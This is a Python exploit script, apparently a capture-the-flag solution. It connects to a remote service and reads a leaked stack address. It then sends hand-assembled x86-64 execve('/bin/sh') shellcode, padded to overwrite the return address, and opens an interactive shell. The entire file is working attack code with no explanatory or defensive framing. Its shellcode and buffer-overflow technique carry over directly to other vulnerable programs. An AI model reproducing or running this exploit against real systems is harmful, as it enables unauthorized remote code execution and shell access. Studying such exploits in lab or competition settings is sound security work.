#!/usr/bin/env python
import sc_pwn
from struct import *

#rhp     = ("sushi.termsec.net",4000)
rhp  = ("192.168.75.129", 8080)

#==========

def attack(nc):    
    shellcode  = '\x48\xbb/bin/sh\x00'  # mov rbx, '/bin/sh'
    shellcode += '\x53'                 # push rbx
    shellcode += '\x48\x89\xe7'         # mov rdi, rsp
    shellcode += '\x6a\x00'             # push 0
    shellcode += '\x57'                 # push rdi
    shellcode += '\x48\x89\xe6'         # mov rsi, rsp
    shellcode += '\xb8\x3b\x00\x00\x00' # mov rax, 0x3b
    shellcode += '\x0f\x05'             # syscall

    nc.read_until('here: ')
    addr_stack = int(nc.read_all(),16)
    nc.sendln(shellcode+'\x00'*(8*9-len(shellcode))+pack('<Q',addr_stack))

    nc.read_all()

#==========

if __name__=='__main__':
    nc = sc_pwn.Communicate(rhp)
    attack(nc)

    sh = sc_pwn.Shell(nc)
    sh.select()

    del(sh)
    del(nc)
    
#==========
